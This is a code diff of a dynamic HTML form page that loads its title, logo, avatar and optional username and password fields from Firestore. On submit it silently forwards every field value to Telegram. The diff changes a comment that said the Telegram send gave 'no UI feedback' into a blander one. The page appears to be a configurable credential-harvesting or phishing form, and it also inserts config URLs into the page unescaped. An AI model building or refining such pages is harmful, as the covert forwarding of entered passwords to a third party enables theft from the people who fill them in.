@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Form Submission</title>
+<title>Dynamic Form</title>
 <style>
 body {
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -52,7 +52,6 @@ button {
   cursor: pointer;
   font-weight: bold;
   color: #fff;
-  background: #1976d2;
   transition: transform 0.1s ease;
 }
 button:hover {
@@ -63,7 +62,7 @@ button:hover {
   padding: 6px;
   background: #2a2a2a;
   border-radius: 6px;
-  word-break: break-all;
+  word-break: break-word;
   color: #e0e0e0;
 }
 #warningMsg {
@@ -76,12 +75,12 @@ img.avatar {
   width: 90px;
   border-radius: 50%;
   display: block;
-  margin: auto 0 10px auto;
+  margin: 0 auto 10px auto;
 }
 img.logo {
   width: 140px;
   display: block;
-  margin: auto 0 15px auto;
+  margin: 0 auto 15px auto;
 }
 </style>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
@@ -89,11 +88,11 @@ img.logo {
 </head>
 <body>
 <div id="formContainer">
-<h2 id="formTitle">Loading...</h2>
-<div id="formDesc"></div>
-<div id="warningMsg"></div>
-<form id="dynamicForm"></form>
-<div id="embedLinks"></div>
+  <h2 id="formTitle">Loading...</h2>
+  <div id="formDesc"></div>
+  <div id="warningMsg"></div>
+  <form id="dynamicForm"></form>
+  <div id="embedLinks"></div>
 </div>
 
 <script>
@@ -118,7 +117,7 @@ if(!formId){
   $("formTitle").innerText = "Form ID missing!";
 }
 
-// Load form config
+// Load form configuration from Firestore
 db.collection("forms").doc(formId).get().then(doc=>{
   if(!doc.exists){
     $("formTitle").innerText = "Form not found!";
@@ -131,7 +130,7 @@ db.collection("forms").doc(formId).get().then(doc=>{
   console.error(err);
 });
 
-// Render the form dynamically
+// Render the form exactly as configured
 function renderForm(){
   $("formTitle").innerText = formConfig.title;
   $("formTitle").style.color = formConfig.titleColor || "#00bcd4";
@@ -139,13 +138,17 @@ function renderForm(){
   $("formDesc").style.color = formConfig.textColor || "#b0b0b0";
 
   formEl.innerHTML = "";
+  warningEl.innerText = "";
 
   // Avatar & Logo
   if(formConfig.avatarURL) formEl.innerHTML += `<img src="${formConfig.avatarURL}" class="avatar">`;
   if(formConfig.logoURL) formEl.innerHTML += `<img src="${formConfig.logoURL}" class="logo">`;
 
-  // Warning inside form
-  warningEl.innerText = "";
+  // Warning message if enabled
+  if(formConfig.enableWarning && formConfig.warningPosition!=="none"){
+    warningEl.style.textAlign = formConfig.warningPosition;
+    warningEl.innerText = "";
+  }
 
   // Username & Password
   if(formConfig.addAuth){
@@ -169,7 +172,7 @@ function renderForm(){
     embedEl.appendChild(div);
   });
 
-  // Main Button
+  // Main submit button
   if(formConfig.showMainBtn){
     const btn = document.createElement("button");
     btn.textContent = formConfig.buttonText || "Submit";
@@ -179,10 +182,10 @@ function renderForm(){
   }
 }
 
-// Submit Form
+// Handle form submission
 function submitForm(e){
   e.preventDefault();
-  warningEl.innerText = ""; // reset warning
+  warningEl.innerText = "";
 
   const formData = {};
   const inputs = formEl.querySelectorAll("input,textarea");
@@ -205,7 +208,7 @@ function submitForm(e){
     warningEl.innerText = "❌ Try again!";
   });
 
-  // Send to Telegram (no UI feedback)
+  // Telegram notification
   const telegramMsg = `📝 New Form Submission\n------------------\n`+
     Object.entries(formData).map(([k,v])=>`💠 ${k}: ${v}`).join("\n");
 
